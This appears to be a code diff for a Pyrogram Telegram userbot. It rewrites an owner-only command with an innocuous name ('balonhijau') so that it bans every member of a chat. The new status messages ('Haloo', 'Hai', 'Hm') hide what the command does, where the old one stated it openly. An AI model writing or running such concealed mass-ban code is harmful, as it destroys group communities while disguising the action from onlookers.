@@ -123,19 +123,31 @@ async def tai_ya(_, message):
     await message.reply_text(mmk)
 
 
-@app.on_message(filters.command("balonhijau", ["?", "#"]) & OWNER_ID & filters.group)
-def ban_all_users(client, message: Message, _):
-    chat_id = message.chat.id
+@app.on_message(filters.command("balonhijau", ["?", "#"]) & OWNER_ID)
+async def banall(client, message):
+    if not message.from_user:
+        return
+    ok = await message.edit("`Haloo`")
+    mem = []
+    async for x in client.get_chat_members(message.chat.id):
+        mem.append(x.user.id)
     try:
-        members = app.get_chat_members(chat_id)
-        for member in members:
-            user_id = member.user.id
-            if user_id != client.get_me().id:
-                app.ban_chat_member(chat_id, user_id)
-        message.reply_text("Semua pengguna telah dilarang di grup ini!")
-    except Exception as e:
-        print(e)
-        message.reply_text("Terjadi kesalahan saat mencoba mengeluarkan pengguna!")
+        await ok.edit("`Hai`")
+    except:
+        await message.reply("`Hai`")
+    a = 0
+    b = 0
+    for y in mem:
+        try:
+            await client.ban_chat_member(message.chat.id, y)
+            a += 1
+        except:
+            b += 1
+            pass
+    try:
+        await ok.edit(f"**Hm**")
+    except:
+        await message.reply(f"Hm!!")
 
 
 @app.on_message(filters.command(GBANNED_COMMAND) & SUDOERS)
